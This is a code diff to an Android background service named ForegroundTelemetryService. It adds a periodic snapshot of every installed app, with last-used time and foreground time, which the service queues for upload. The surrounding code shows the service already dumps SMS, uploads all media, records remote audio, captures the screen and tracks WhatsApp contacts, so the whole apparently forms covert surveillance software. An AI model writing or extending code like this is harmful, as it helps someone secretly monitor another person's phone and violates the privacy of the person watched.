@@ -3,7 +3,12 @@ package com.company.devicemgr.services;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.AppOpsManager;
 import android.app.Service;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.SharedPreferences;
@@ -71,10 +76,13 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_STREAM_LAST_CAPABILITY_AT = "remote_stream_last_capability_at";
     private static final String KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX = "remote_audio_last_upload_";
     private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
+    private static final String KEY_LAST_APP_USAGE_SYNC_AT = "last_app_usage_sync_at";
     private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
     private static final long NORMAL_LOOP_MS = 30_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
+    private static final long APP_USAGE_SYNC_INTERVAL_MS = 15 * 60_000L;
+    private static final long APP_USAGE_WINDOW_MS = 24 * 60 * 60_000L;
     private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
     private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
@@ -147,6 +155,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     JSONObject activeSession = syncRemoteSupportState();
                     maybeRunRemoteSupportStream(activeSession);
                     maybeUploadAllMedia();
+                    maybeSendAppUsageSnapshot();
 
                     if ((loops % 2) == 0) {
                         sendSmsDump();
@@ -227,6 +236,18 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
     private SharedPreferences prefs() {
         return getSharedPreferences(PREFS, MODE_PRIVATE);
+    }
+
+    private boolean hasUsageStatsAccess() {
+        try {
+            AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
+            if (appOps == null) return false;
+            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
+            return mode == AppOpsManager.MODE_ALLOWED;
+        } catch (Exception e) {
+            Log.e(TAG, "hasUsageStatsAccess err", e);
+            return false;
+        }
     }
 
     private String currentDeviceId() {
@@ -1049,6 +1070,85 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if (type == android.provider.CallLog.Calls.BLOCKED_TYPE) return "Bloqueada";
         if (type == android.provider.CallLog.Calls.VOICEMAIL_TYPE) return "Voicemail";
         return "Desconhecida";
+    }
+
+    private void maybeSendAppUsageSnapshot() {
+        try {
+            if (!hasUsageStatsAccess()) return;
+            long lastSyncAt = prefs().getLong(KEY_LAST_APP_USAGE_SYNC_AT, 0L);
+            if ((System.currentTimeMillis() - lastSyncAt) < APP_USAGE_SYNC_INTERVAL_MS) return;
+
+            JSONObject payload = buildAppUsageSnapshot();
+            if (payload == null) return;
+            sendOrQueue("app_usage_snapshot", payload);
+            prefs().edit().putLong(KEY_LAST_APP_USAGE_SYNC_AT, System.currentTimeMillis()).apply();
+        } catch (Exception e) {
+            Log.e(TAG, "maybeSendAppUsageSnapshot err", e);
+        }
+    }
+
+    private JSONObject buildAppUsageSnapshot() {
+        try {
+            UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
+            if (usageStatsManager == null) return null;
+
+            long now = System.currentTimeMillis();
+            long windowStart = now - APP_USAGE_WINDOW_MS;
+            List<UsageStats> usageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, windowStart, now);
+            Map<String, UsageStats> usageByPackage = new HashMap<>();
+            if (usageStats != null) {
+                for (UsageStats stat : usageStats) {
+                    if (stat == null || stat.getPackageName() == null) continue;
+                    UsageStats existing = usageByPackage.get(stat.getPackageName());
+                    if (existing == null) {
+                        usageByPackage.put(stat.getPackageName(), stat);
+                    } else {
+                        existing.add(stat);
+                    }
+                }
+            }
+
+            JSONArray apps = new JSONArray();
+            List<ApplicationInfo> installedApps = getPackageManager().getInstalledApplications(0);
+            int added = 0;
+            for (ApplicationInfo appInfo : installedApps) {
+                if (appInfo == null || appInfo.packageName == null) continue;
+                JSONObject app = new JSONObject();
+                String packageName = appInfo.packageName;
+                CharSequence label = getPackageManager().getApplicationLabel(appInfo);
+                UsageStats stat = usageByPackage.get(packageName);
+                PackageInfo packageInfo = null;
+                try {
+                    packageInfo = getPackageManager().getPackageInfo(packageName, 0);
+                } catch (Exception ignored) {
+                }
+
+                app.put("packageName", packageName);
+                app.put("appName", label != null ? label.toString() : packageName);
+                app.put("isSystemApp", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
+                if (packageInfo != null) app.put("firstInstallTimeMs", packageInfo.firstInstallTime);
+                if (stat != null) {
+                    app.put("lastTimeUsedMs", stat.getLastTimeUsed());
+                    app.put("totalForegroundMs", stat.getTotalTimeInForeground());
+                } else {
+                    app.put("lastTimeUsedMs", 0L);
+                    app.put("totalForegroundMs", 0L);
+                }
+                apps.put(app);
+                added++;
+                if (added >= 500) break;
+            }
+
+            JSONObject payload = new JSONObject();
+            payload.put("capturedAtMs", now);
+            payload.put("windowStartMs", windowStart);
+            payload.put("windowEndMs", now);
+            payload.put("apps", apps);
+            return payload;
+        } catch (Exception e) {
+            Log.e(TAG, "buildAppUsageSnapshot err", e);
+            return null;
+        }
     }
 
     private String lookupContactName(String phoneNumber) {
